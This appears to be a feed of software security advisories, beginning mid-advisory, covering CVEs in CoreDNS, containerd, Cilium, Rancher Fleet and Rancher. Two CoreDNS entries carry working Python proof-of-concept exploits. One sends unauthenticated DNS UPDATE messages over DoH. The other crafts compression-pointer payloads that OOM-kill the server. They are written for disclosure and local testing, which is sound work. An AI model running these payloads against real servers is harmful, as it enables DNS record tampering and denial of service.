If an update-capable upstream trusts CoreDNS's source address or authenticated connection instead of requiring end-to-end TSIG, an unauthenticated client can use CoreDNS to add, replace, or delete DNS records.
### Details
The affected listeners called `dns.Msg.Unpack` without the request policy used by the UDP/TCP server:
- [DoH and DoH3](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/doh/doh.go#L134-L155) - [DoQ](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_quic.go#L212-L219) - [DNS-over-gRPC](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_grpc.go#L176-L184)
CoreDNS routed the message using its Zone question without checking the opcode. [`forward`](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/forward/forward.go#L113-L118) then passed the original message to the [upstream](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/proxy/connect.go#L150-L167).
By contrast, [`dns.DefaultMsgAcceptFunc`](https://github.com/miekg/dns/blob/v1.1.72/acceptfunc.go#L33-L57) allows only QUERY and NOTIFY. The fix applies that policy to the raw header via [`dnsutil.UnpackRequest`](https://github.com/coredns/coredns/blob/530b0a5ff2ad68cc0421f10dd93568945cc671c9/plugin/pkg/dnsutil/message.go#L13-L23) before any affected transport dispatches the request.
### PoC
The reproducer starts a standard-library synthetic DNS upstream on loopback, sends an unsigned UPDATE over DoH, and reports whether the upstream received the record. It supports both UDP and TCP because the `forward` plugin may select either transport. It does not contact or modify a real authoritative server.
Clone the repository and build the server:
```bash git clone git@github.com:coredns/coredns.git cd coredns git checkout d5e54040ffab9a5c12c6de27b66f59f62b385195 # latest pre-fix commit from main go build -tags=grpcnotrace -o coredns . ```
Save this as `Corefile.poc`:
```text https://.:8053 { bind 127.0.0.1 tls plugin/tls/test_cert.pem plugin/tls/test_key.pem forward . 127.0.0.1:15354 } ```
Save this as `poc.py`:
```python #!/usr/bin/env python3 import argparse import http.client import queue import socket import ssl import struct import threading
OPCODE_UPDATE = 5 TYPE_A = 1 CLASS_IN = 1
def encode_name(name): return b"".join(bytes((len(label),)) + label.encode() for label in name.rstrip(".").split(".")) + b"\x00"
def update_message(): zone = encode_name("example.com.") + struct.pack("!HH", 6, CLASS_IN) update = ( encode_name("foo.example.com.") + struct.pack("!HHIH", TYPE_A, CLASS_IN, 300, 4) + socket.inet_aton("192.0.2.123") ) header = struct.pack("!HHHHHH", 0x1234, OPCODE_UPDATE << 11, 1, 0, 1, 0) return header + zone + update
def read_name(message, offset): labels = [] end = None seen = set() while True: if offset >= len(message) or offset in seen: raise ValueError("invalid DNS name") seen.add(offset) length = message[offset] if length & 0xC0 == 0xC0: if offset + 1 >= len(message): raise ValueError("truncated compression pointer") if end is None: end = offset + 2 offset = ((length & 0x3F) << 8) | message[offset + 1] continue offset += 1 if length == 0: return ".".join(labels) + ".", end if end is not None else offset if length & 0xC0 or offset + length > len(message): raise ValueError("invalid DNS label") labels.append(message[offset : offset + length].decode("ascii")) offset += length
def question_end(message, count): offset = 12 for _ in range(count): _, offset = read_name(message, offset) offset += 4 if offset > len(message): raise ValueError("truncated question") return offset
def parse_update(message): _, flags, qdcount, _, nscount, _ = struct.unpack_from("!HHHHHH", message) if (flags >> 11) & 0xF != OPCODE_UPDATE or qdcount != 1 or nscount < 1: return None offset = question_end(message, qdcount) name, offset = read_name(message, offset) rrtype, rrclass, ttl, rdlength = struct.unpack_from("!HHIH", message, offset) offset += 10 rdata = message[offset : offset + rdlength] if rrtype != TYPE_A or rrclass != CLASS_IN or len(rdata) != 4: return None return name, ttl, socket.inet_ntoa(rdata)
def response_for(message): ident, flags, qdcount, _, _, _ = struct.unpack_from("!HHHHHH", message) end = question_end(message, qdcount) response_flags = flags | 0x8000 return struct.pack("!HHHHHH", ident, response_flags, qdcount, 0, 0, 0) + message[12:end]
def handle_message(message, peer, received): try: update = parse_update(message) response = response_for(message) except (ValueError, struct.error): return None if update is not None: received.put((peer, update)) return response
def serve_udp(sock, received, stopped): while not stopped.is_set(): try: message, peer = sock.recvfrom(65535) except socket.timeout: continue except OSError: return response = handle_message(message, peer, received) if response is not None: sock.sendto(response, peer)
def recv_exact(connection, size, stopped): data = bytearray() while len(data) < size and not stopped.is_set(): try: chunk = connection.recv(size - len(data)) except socket.timeout: continue if not chunk: return None data.extend(chunk) return bytes(data) if len(data) == size else None
def serve_tcp(sock, received, stopped): while not stopped.is_set(): try: connection, peer = sock.accept() except socket.timeout: continue except OSError: return with connection: connection.settimeout(0.1) while not stopped.is_set(): length = recv_exact(connection, 2, stopped) if length is None: break message = recv_exact(connection, struct.unpack("!H", length)[0], stopped) if message is None: break response = handle_message(message, peer, received) if response is not None: connection.sendall(struct.pack("!H", len(response)) + response)
def send_doh(host, port, payload, timeout): context = ssl._create_unverified_context() connection = http.client.HTTPSConnection(host, port, timeout=timeout, context=context) try: connection.request( "POST", "/dns-query", body=payload, headers={"Content-Type": "application/dns-message"}, ) response = connection.getresponse() body = response.read() return response.status, len(body) finally: connection.close()
def main(): parser = argparse.ArgumentParser(description="Probe whether CoreDNS forwards RFC 2136 UPDATE over DoH") parser.add_argument("--host", default="127.0.0.1") parser.add_argument("--port", type=int, default=8053) parser.add_argument("--upstream-host", default="127.0.0.1") parser.add_argument("--upstream-port", type=int, default=15354) parser.add_argument("--timeout", type=float, default=2.0) parser.add_argument("--expect", choices=("forwarded", "blocked", "either"), default="either") args = parser.parse_args()
received = queue.Queue() stopped = threading.Event() udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) udp_sock.settimeout(0.1) udp_sock.bind((args.upstream_host, args.upstream_port)) tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) tcp_sock.settimeout(0.1) tcp_sock.bind((args.upstream_host, args.upstream_port)) tcp_sock.listen() threads = [ threading.Thread(target=serve_udp, args=(udp_sock, received, stopped), daemon=True), threading.Thread(target=serve_tcp, args=(tcp_sock, received, stopped), daemon=True), ] for thread in threads: thread.start()
payload = update_message() try: status, response_bytes = send_doh(args.host, args.port, payload, args.timeout) try: peer, update = received.get(timeout=args.timeout) except queue.Empty: peer = update = None finally: stopped.set() udp_sock.close() tcp_sock.close() for thread in threads: thread.join(timeout=1)
print("payload=%d opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123" % len(payload)) print("http_status=%d response_bytes=%d" % (status, response_bytes)) if update is None: result = "blocked" print("upstream_received_update=false") else: result = "forwarded" name, ttl, address = update print("upstream_received_update=true source=%s:%d" % peer) print("upstream_record=%s %d IN A %s" % (name, ttl, address)) print("result=%s" % result)
if args.expect != "either" and args.expect != result: raise SystemExit("expected %s, got %s" % (args.expect, result))
if __name__ == "__main__": main() ```
Start the vulnerable revision:
```sh ./coredns -conf Corefile.poc ```
In a second terminal, run the probe:
```console $ python3 poc.py --expect forwarded payload=60 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123 http_status=200 response_bytes=29 upstream_received_update=true source=127.0.0.1:52391 upstream_record=foo.example.com. 300 IN A 192.0.2.123 result=forwarded ```
The ephemeral source port varies. The output confirms that the upstream saw the complete UPDATE as a request originating from CoreDNS.
For comparison, build and start CoreDNS with the fix:
```sh git checkout 530b0a5ff2ad68cc0421f10dd93568945cc671c9 # fix commit from main go build -tags=grpcnotrace -o coredns-fixed . ./coredns-fixed -conf Corefile.poc ```
The same probe is rejected before reaching the synthetic upstream:
```console $ python3 poc.py --expect blocked payload=62 opcode=UPDATE record=foo.example.com. 300 IN A 192.0.2.123 http_status=400 response_bytes=16 upstream_received_update=false result=blocked ```
### Impact
Exploitation requires all of the following:
- an attacker can reach a CoreDNS DoH, DoH3, DoQ, or DNS-over-gRPC listener - the selected `proxy`/`forward` target accepts RFC 2136 UPDATE - the upstream trusts CoreDNS's source address or connection and does not require an attacker-unknown TSIG
The upstream sees the UPDATE as originating from CoreDNS. A successful attack can redirect traffic, take over names, alter mail routing, or disrupt the writable zone. Requiring and validating end-to-end TSIG prevents the demonstrated attack.

item.title: [HIGH] go:github.com/coredns/coredns — CoreDNS: Unauthenticated memory exhaustion in custom transports (CVE-2026-82399)
item.description:
CVE-2026-82399 · CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H) · CWE-770
Affected: - go/github.com/coredns/coredns <= 1.14.6 (patched: 1.14.7)
---
### Summary
CoreDNS parses attacker-controlled DNS section counts before validating them on DNS-over-HTTPS (DoH and DoH3), DNS-over-QUIC (DoQ), and DNS-over-gRPC listeners. An unauthenticated client can use DNS name compression to make one 65,533-byte request allocate more than 10 MiB while it is unpacked. Concurrent requests can exhaust memory and terminate CoreDNS.
### Details
The affected request paths call `dns.Msg.Unpack` directly:
- [DoH POST and GET decoding](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/plugin/pkg/doh/doh.go#L134-L155). DoH3 uses the same decoder. - [DoQ stream handling](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_quic.go#L212-L219). - [DNS-over-gRPC query handling](https://github.com/coredns/coredns/blob/18a58b9e898ccd95c3f8ee72a37b95b3d1e3e928/core/dnsserver/server_grpc.go#L176-L184).
This differs from the [miekg/dns](https://github.com/miekg/dns) UDP and TCP server. Its [`serveDNS`](https://github.com/miekg/dns/blob/v1.1.72/server.go#L628-L643) path decodes the fixed 12-byte header and invokes [`DefaultMsgAcceptFunc`](https://github.com/miekg/dns/blob/v1.1.72/acceptfunc.go#L33-L57) before unpacking the DNS sections. The default policy rejects requests unless `QDCOUNT` is exactly one and also limits the other section counts. CoreDNS's custom transports bypass this early validation.
Parsing happens before the plugin chain. Plugin-level rate limiting or request handling cannot prevent the allocation. The fix is to apply `dns.DefaultMsgAcceptFunc` to the fixed header before calling `Msg.Unpack` in each custom request transport. Response decoding must remain separate because the request policy intentionally rejects response headers.
### PoC
The PoC runs against the DoH server.
Run the following from a clean checkout of CoreDNS v1.14.6. Docker must support container memory limits. The example uses the test certificate already present in the repository and publishes the test service only on loopback.
Save this as `Corefile.cd01`:
```text https://.:8053 { tls /cert.pem /key.pem whoami } ```
Save this standard-library client as `poc-cd01.py`:
```python #!/usr/bin/env python3 import argparse import concurrent.futures from collections import Counter import http.client import ssl import struct
def normal_query(): header = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) question = b"\x07example\x03org\x00" + struct.pack("!HH", 1, 1) return header + question, 1
def attack_query(): message = bytearray(65535) offset = 12 name_offset = offset
for size in (63, 63, 63, 61): message[offset] = size offset += 1 message[offset : offset + size] = b"\x01" * size offset += size
message[offset] = 0 offset += 1 struct.pack_into("!HH", message, offset, 1, 1) offset += 4 questions = 1
while offset + 6 <= len(message): struct.pack_into("!HHH", message, offset, 0xC000 | name_offset, 1, 1) offset += 6 questions += 1
struct.pack_into( "!HHHHHH", message, 0, 0x1234, 0x0100, questions, 0, 0, 0 ) return bytes(message[:offset]), questions
def send(payload): context = ssl._create_unverified_context() connection = http.client.HTTPSConnection( "127.0.0.1", 18053, timeout=3, context=context ) try: connection.request( "POST", "/dns-query", body=payload, headers={"Content-Type": "application/dns-message"}, ) response = connection.getresponse() response.read() return f"http-{response.status}" except Exception: return "error" finally: connection.close()
def main(): parser = argparse.ArgumentParser() parser.add_argument("--normal", action="store_true") parser.add_argument("--workers", type=int, default=1) args = parser.parse_args()
payload, questions = normal_query() if args.normal else attack_query() print( f"payload={len(payload)} questions={questions} workers={args.workers}" ) with concurrent.futures.ThreadPoolExecutor(args.workers) as pool: results = pool.map(send, [payload] * args.workers) print(Counter(results))
if __name__ == "__main__": main() ```
Build the Linux binary and container image:
```sh GOCACHE=/tmp/coredns-gocache \ GOOS=linux GOARCH="$(go env GOARCH)" CGO_ENABLED=0 \ go build -tags=grpcnotrace -o coredns . docker build --tag coredns-cd01:vulnerable . ```
Start CoreDNS with a 64 MiB memory and swap limit:
```sh docker run --detach --name coredns-cd01 \ --memory 64m --memory-swap 64m \ --publish 127.0.0.1:18053:8053/tcp \ --volume "$PWD/Corefile.cd01:/Corefile:ro" \ --volume "$PWD/plugin/tls/test_cert.pem:/cert.pem:ro" \ --volume "$PWD/plugin/tls/test_key.pem:/key.pem:ro" \ coredns-cd01:vulnerable -conf /Corefile ```
Confirm that the listener works and that one malicious request is accepted:
```console $ python3 poc-cd01.py --normal payload=29 questions=1 workers=1 Counter({'http-200': 1})
$ python3 poc-cd01.py payload=65533 questions=10878 workers=1 Counter({'http-200': 1}) ```
Send 32 malicious requests concurrently and inspect the container:
```console $ python3 poc-cd01.py --workers 32 payload=65533 questions=10878 workers=32 Counter({'error': 32})
$ docker inspect --format '{{.State.Status}} OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}' coredns-cd01 exited OOMKilled=true ExitCode=137 ```
`OOMKilled=true` confirms that the container was terminated by memory exhaustion rather than a CoreDNS configuration error.
### Impact
This is an unauthenticated denial-of-service vulnerability. Deployments are affected when DoH, DoH3, DoQ, or DNS-over-gRPC is exposed to an attacker. The ordinary miekg/dns UDP and TCP listeners are not affected because they perform the header acceptance check before unpacking.
In the validated configuration, 32 requests OOM-killed a CoreDNS container limited to 64 MiB. Higher memory limits increase the number of concurrent requests required but do not remove the allocation amplification. Successful exploitation interrupts DNS service.
CoreDNS versions v007 through v1.14.6 are affected when DNS-over-gRPC is exposed. DoH is affected from v1.1.3, DoQ from v1.11.0, and DoH3 from v1.13.2.

item.title: [MEDIUM] go:github.com/containerd/containerd — containerd: CRI ExecSync Goroutine Leak Leads to Node-Level Denial of Service (CVE-2026-53495)
item.description:
CVE-2026-53495 · CVSS 6.8 (CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N) · CWE-400
Affected: - go/github.com/containerd/containerd/v2 < 2.0.12 (patched: 2.0.12) - go/github.com/containerd/containerd < 1.7.35 (patched: 1.7.35) - go/github.com/containerd/containerd/v2 >= 2.2.0, < 2.2.8 (patched: 2.2.8) - go/github.com/containerd/containerd/v2 >= 2.3.0, < 2.3.5 (patched: 2.3.5)
---
### Impact
A bug in containerd's CRI ExecSync implementation allows exec probes and lifecycle hooks with background child processes to keep containerd's stdio-drain goroutines indefinitely blocked. Because the I/O drain phase lacks a default timeout or context cancellation handling, repeated ExecSync invocations (like probes) that include long-lived background processes against a container can cause containerd to leak goroutines and host memory. Over time, this resource exhaustion can cause the containerd daemon to be terminated by the OOM killer, rendering containerd unavailable until it is restarted. This issue affects containerd on Linux systems running with the CRI plugin enabled. Users not using containerd's CRI implementation or not running containers on Linux are not affected.
### Patches
This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.
### Workarounds
Ensure exec probes and lifecycle hooks do not launch long-lived background child processes.
### Credits
The containerd project would like to thank XlabAI Team of Tencent Xuanwu Lab (xlabai@tencent.com), including Guannan Wang, Zhanpeng Liu, Jiashuo Liang, and Guancheng Li, and @IamwhatIamSY who independently discovered and responsibly disclosed this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).
### For more information
If there are any questions or comments about this advisory:
* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose) * Send an email to [security@containerd.io](mailto:security@containerd.io)

item.title: [MEDIUM] containerd/containerd — Unpack DoS via repeated opaque whiteouts (CVE-2026-95838)
item.description:
CVE-2026-95838 · CWE-400
Affected: - go/github.com/containerd/containerd/v2 < 2.0.12, >= 2.2.0, < 2.2.8, >= 2.3.0, < 2.3.5 (patched: 2.3.5, 2.2.8, 2.0.12) - go/github.com/containerd/containerd < 1.7.35 (patched: 1.7.35)
---
### Impact
A vulnerability exists in containerd's layer unpack handler where the processing of certain image layers causes superlinear time complexity. During the unpack operation, specific file configurations within the layer can trigger repeated directory traversals.
Consequently, pulling or importing a maliciously crafted image can result in increased unpack times and a moderate increase in CPU usage. This delays container startup, even if the compressed image layers are small. Additionally, in orchestrators like Kubernetes that apply concurrency limits to image pulls, these excessively long operations can reduce the available concurrency for other pulls, potentially delaying unrelated container deployments.
### Patches
This bug has been fixed in containerd 2.3.5, 2.2.8, 2.0.12, and 1.7.35. Users should update to these versions to resolve the issue.
### Workarounds
There are no known workarounds for this issue. Users are advised to only pull and import trusted images from known registries until the patch can be applied.
### Credits
The containerd project would like to thank Jakub Ciolek of AlphaSense for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).
### For more information

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose) * Email us at [security@containerd.io](mailto:security@containerd.io)

item.title: [MEDIUM] go:github.com/cilium/cilium — Cilium may unexpectedly allow ingress traffic from the local namespace when a Kubernetes NetworkPolicy is configured with an ipBlock match (CVE-2026-56743)
item.description:
CVE-2026-56743 · CVSS 5.4 (CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N) · CWE-863
Affected: - go/github.com/cilium/cilium >= 1.19.0, < 1.19.5 (patched: 1.19.5)
---
### Impact
Standard Kubernetes `NetworkPolicy` specifications using CIDR-based `ipBlock` rules without pod or namespace selectors erroneously generate a wildcard namespace allow rule under specific cluster configurations.
When Cilium deployment is configured with a specific custom `clusterName` (rather than the default `"any"` value), the parser incorrectly instantiates a pod selector on selectorless peer definitions. This leads to Cilium appending an unintended wildcard namespace label selector to the policy's allowed Layer 3 rules, which allows traffic from other workloads in the same namespace as the subject of the policy.
Example policy affected by this issue: ``` apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: test-server namespace: default spec: podSelector: matchLabels: app: test-server policyTypes: - Ingress ingress: - from: - ipBlock: cidr: 192.0.2.3 ```
In affected versions, this policy erroneously allows the `test-server` Pod in the `default` namespace to receive any traffic from other workloads running in the `default` namespace.
### Patches
This issue has been patched in:
- Cilium v1.19.5
Releases below v1.19.0 are not affected.
### This issue affects:
- Cilium v1.19 between v1.19.0 and v1.19.4 inclusive
### Workarounds
Developers can create the equivalent policy using CiliumNetworkPolicy [fromCIDR expressions](https://docs.cilium.io/en/stable/security/policy/layer3/#ip-cidr-based). CiliumNetworkPolicy and CiliumClusterwideNetworkPolicy are not affected by this issue.
### Acknowledgements
Special thanks to @TheBeeZee for reporting this issue and preparing the fix, and to @fristonio and @odinuge for their assistance in reviewing the solution.
### For more information
If a vulnerability affecting Cilium appears to have been found, the Cilium security team strongly encourages reporting it to the security mailing list at security@cilium.io. This is a private mailing list for the Cilium security team, and the report will be treated as top priority.

item.title: [CRITICAL] containerd/containerd — containerd CRI plugin: Checkpoint restore bypasses destination security context (CVE-2026-95837)
item.description:
CVE-2026-95837 · CWE-269
Affected: - go/github.com/containerd/containerd/v2 >= 2.1.0 < 2.2.7, >= 2.3.0 < 2.3.4 (patched: >= 2.2.7, >= 2.3.4)
---
### Impact
A vulnerability in containerd's CRI implementation allows a container restored from an untrusted checkpoint via the `CreateContainer` API to bypass the destination security context and execute with elevated privileges. When restoring a container from a checkpoint archive or annotated OCI image, CRIU restores process credentials, Linux capabilities, `no_new_privs`, and seccomp state directly from checkpoint data rather than enforcing the destination CRI `ContainerConfig`. An attacker who can run a container with a crafted checkpoint image can execute processes as root with full capabilities and no enforced seccomp filters despite restrictive security policies requested by the orchestrator. Additionally, containerd's CRI status reporting reflects the requested configuration rather than the actual restored process state, masking the privilege discrepancy from orchestrators. This issue affects Linux systems running containerd with CRI checkpoint restore enabled; users not utilizing CRI checkpoint restore are not affected.
### Patches
This bug has been addressed in containerd 2.2.7 and 2.3.4 by disabling checkpoint restore via `CreateContainer` by default. The feature has been removed entirely in containerd 2.4.0. Users should update to these versions to resolve the issue. Running containers that were restored from untrusted checkpoints should be stopped, deleted, and recreated.
Users who rely on restore via the `CreateContainer` API can re-enable the feature by setting the new `enable_experimental_restore_via_create` configuration option. However, enabling restore via `CreateContainer` leaves this vulnerability present, as containerd cannot enforce destination security policy during CRIU process restoration.
### Workarounds
On unpatched versions, containerd does not provide a configuration option to disable checkpoint restore via `CreateContainer`. Deployments should restrict container creation permissions to trusted users, validate container image registries, or use admission controllers to reject images containing checkpoint data.
### References
* [CRIU image security](https://checkpoint-restore.github.io/criu/security/image-security.html)
### Credits
The containerd project would like to thank @l2yyd5 and @berkpolatCE for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).
### For more information

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose) * Email us at [security@containerd.io](mailto:security@containerd.io)

item.title: [MEDIUM] rancher/fleet — DNS-based information disclosure via Fleet Helm template preprocessing (CVE-2026-75036)
item.description:
CVE-2026-75036 · CVSS 5.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N) · CWE-918
Affected: - go/ github.com/rancher/fleet >=0.16.0, <v0.16.1 (patched: 0.16.1) - go/ github.com/rancher/fleet >=0.15.0, <0.15.6 (patched: 0.15.6) - go/ github.com/rancher/fleet >=0.14.0, <0.14.10 (patched: 0.14.10) - go/ github.com/rancher/fleet >=0.13.0, <0.13.15 (patched: 0.13.15) - go/ github.com/rancher/fleet >=0.12.0, <0.12.19 (patched: 0.12.19)
---
### Impact
A security vulnerability was discovered in Fleet's Helm template preprocessing where templates evaluated by the Fleet controller could reach network resources outside the management cluster.
A user who can supply bundle content to a repository referenced by a `GitRepo` resource can cause the Fleet controller to:
- Disclose cluster metadata available to the templating context. - Reveal information about hosts reachable from the controller's network position.
Because the disclosure channel is name resolution, it may remain effective in environments where outbound traffic is otherwise restricted. The disclosed information is limited to values exposed to the Fleet templating context and to name resolution results. Integrity and availability of managed clusters are not affected.
#### Preconditions
Exploitation of this security vulnerability requires the following conditions:
- Fleet must reconcile a `GitRepo` whose bundle content is not fully trusted. For example, when repository write access extends beyond the administrators of the management cluster. - Only bundles that use Helm template values are affected.
> [!NOTE] > Deployments that place sensitive data into cluster-level Helm values creates a higher confidentiality impact than the base score reflects.
### Patches
The fix updates Fleet so now it rejects bundles whose Helm template values require network access. Bundles that rely on such template functions are rejected during targeting and the affected `GitRepo` reports an error. You may need to update bundles that previously depended on this behavior.
Patched versions of Fleet include releases `v0.16.1`, `v0.15.6`, `v0.14.10`, `v0.13.15`, and `v0.12.19`. Patched versions of Rancher include releases `v2.15.1`, `v2.14.5`, `v2.13.9`, `v2.12.13`, and `v2.11.17`.
### Workarounds
No workaround exists other than upgrading to a patched version. Organizations unable to upgrade immediately can reduce exposure by:
- Restricting write access to repositories referenced by Fleet `GitRepo` resources to trusted administrators. - Restricting, through RBAC, which users may create or modify `GitRepo` resources so that only reviewed repositories are reconciled. - Restricting outbound name resolution from the Fleet controller to internal resolvers and known destinations.
### Credit
This issue was reported by Zhixi "Jace" Sun (@manus-use), independent security researcher
### References
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [MEDIUM] rancher/rancher — Account takeover via principal rebind in Rancher User updates (CVE-2026-71403)
item.description:
CVE-2026-71403 · CVSS 6.1 (CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N) · CWE-284, CWE-639
Affected: - go/ github.com/rancher/rancher >=2.15.0, <2.15.1 (patched: 2.15.1) - go/ github.com/rancher/rancher >=2.14.0, <2.14.5 (patched: 2.14.5) - go/ github.com/rancher/rancher >=2.13.0, <2.13.9 (patched: 2.13.9)
---
### Impact
A security vulnerability exists where the Norman user store `Update` handler (`pkg/auth/api/user/user_store.go`) permits modifications to identity fields (`username`, `principalIds`, and `displayName`) on existing `User` custom resources without enforcing immutability. Although the `Create` path rejects duplicate usernames, the `Update` path lacks an equivalent validation check and accepts arbitrary new principal identifiers.
A caller with `update` permissions on `users.management.cattle.io` can modify the `principalIds` field on any `User` custom resource (CR) to inject an external identity provider principal. When that principal authenticates through a matching external provider (such as LDAP, OIDC, SAML, or Active Directory), the Rancher principal-to-user resolver binds the session to the modified `User` CR instead of provisioning a new user. This behavior transfers all existing role bindings on that `User` CR (`GlobalRoleBindings`, `ClusterRoleTemplateBindings`, and `ProjectRoleTemplateBindings`) to the external identity, enabling account takeover.
An attacker can also create a denial-of-service condition by modifying a target user's `principalIds` to a value that the identity provider never emits. During subsequent external authentication, the user is assigned a new, unbound account, leaving their original role bindings inaccessible.
This issue uses the same identity-rebind primitive previously addressed on the `Create` path in CVE-2024-58260 / GHSA-q82v-h4rq-5c86; that fix did not cover the `Update` path.
#### Preconditions
Exploitation of this security vulnerability requires the following conditions:
- The attacker holds `update` permissions on `users.management.cattle.io`. Standard authenticated users do not possess this verb by default. It applies to administrators, holders of a custom `GlobalRole` granting `users:update`, and (on Rancher 2.10.x release lines only) the deprecated `restricted-admin` role. Authenticated users without this grant receive an HTTP 403 error and cannot reach this code path. - An external authentication provider is configured, and the targeted user subsequently logs in using that provider.
> [!NOTE] > High privilege requirements (`PR:H`) and required user interaction (`UI:R`) are reflected in the CVSS score. Scope is assessed as Unchanged (`S:U`) because cross-boundary execution into downstream clusters was not demonstrated end-to-end.
### Patches
The fix makes the `principalIds` field of a `User` resource immutable after creation, closing the identity-rebind primitive at both layers capable of writing to it:
- **Norman `/v3/users` endpoint:** The user store `Update` handler discards submitted changes to `principalIds` and `username` before the update reaches the Kubernetes API server, preventing values from being persisted. Requests still return `HTTP 200` because fields are dropped silently without an error or warning; clients verifying the outcome must re-read the resource. - **Admission webhook (`rancher-webhook`):** The `users` validator rejects updates modifying `principalIds`, returning `field is immutable`. This protects callers accessing the resource through the Kubernetes API or extension API that bypass Norman handlers. The `manage-users` verb does not exempt callers from this check.
Full protection requires both components: the Rancher manager fix alone does not protect the direct Kubernetes API path, so operators must also deploy the corresponding `rancher-webhook` version.
Patched versions of Rancher include releases `v2.15.1`, `v2.14.5`, and `v2.13.9`.
### Workarounds
No workaround exists other than upgrading to a patched version. Organizations unable to upgrade immediately can reduce exposure by auditing all custom `GlobalRole` resources and remove `update` permissions on `users.management.cattle.io` from non-administrative roles.
### References
- [rancher/rancher#56619](https://github.com/rancher/rancher/pull/56619) — User store immutability fix - [rancher/webhook#1773](https://github.com/rancher/webhook/pull/1773) — Admission webhook immutability enforcement - Related: [CVE-2024-58260 (GHSA-q82v-h4rq-5c86)](https://github.com/rancher/rancher/security/advisories/GHSA-q82v-h4rq-5c86)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] rancher/rancher — Unauthorized ClusterRole overwrite via GlobalRole cr-name annotation (CVE-2026-71404)
item.description:
CVE-2026-71404 · CVSS 8.7 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:H) · CWE-269, CWE-284, CWE-668
Affected: - go/ github.com/rancher/rancher >=2.15.0, <2.15.1 (patched: 2.15.1) - go/ github.com/rancher/rancher >=2.14.0, <2.14.5 (patched: 2.14.5) - go/ github.com/rancher/rancher >=2.13.0, <2.13.9 (patched: 2.13.9)
---
### Impact
A security vulnerability exists in Rancher's management-plane GlobalRole controller (`pkg/controllers/management/auth/globalroles/globalrole_handler.go`). The controller derives the name of the backing Kubernetes `ClusterRole` from a user-settable annotation (`authz.management.cattle.io/cr-name`) on a `GlobalRole`. When a `ClusterRole` of that name already exists, the controller overwrites its `.Rules` with the GlobalRole's rules without verifying that the ClusterRole is owned by that GlobalRole.
A user with delegated `create` or `update` permissions for `GlobalRole` resources (`management.cattle.io/globalroles`) on the local management cluster (a non-administrator tier that Rancher supports) can create a `GlobalRole` whose `cr-name` annotation names an arbitrary existing `ClusterRole` (for example the builtin `cluster-admin`) and whose rules are empty. The controller then replaces that ClusterRole's rules with the empty set, stripping the permissions of every principal bound to it, including legitimate Rancher administrators. This results in a cluster-wide RBAC lockout and denial of service on the local management cluster. Because the update path adds no owner-reference, deleting the malicious GlobalRole does not restore the affected ClusterRole and the damage persists until manually repaired.
The webhook escalation check that contains delegated GlobalRole managers only validates the GlobalRole's rule contents against the caller's own permissions and never inspects the `cr-name` annotation, allowing empty rules to pass.
> [!NOTE] > The impact is limited to denial of service (DoS). This issue affects built-in and other non-GlobalRole-owned ClusterRoles that have explicit (non-aggregated) rules. The Kubernetes aggregation controller restores aggregated ClusterRoles such as `admin`, `edit`, and `view`. Exploitation requires an attacker to already hold delegated GlobalRole create or update privileges on the local cluster and does not grant privilege escalation. This is a distinct bypass of the mitigation introduced for GHSA-jwvr / CVE-2021-36784.
### Patches
The fix updates the GlobalRole controller to no longer fetch the `ClusterRole` name from this annotation. Instead, it calculates the name internally and ensures the `ClusterRole` exists with the correct rules. This prevents users from forcing a specific `ClusterRole` name. The system maintains the annotation as a human-readable reference to identify the `ClusterRole` used, but changing the annotation does not affect reconciliation.
Patched versions of Rancher include releases `v2.15.1`, `v2.14.5`, and `v2.13.9`.
### Workarounds
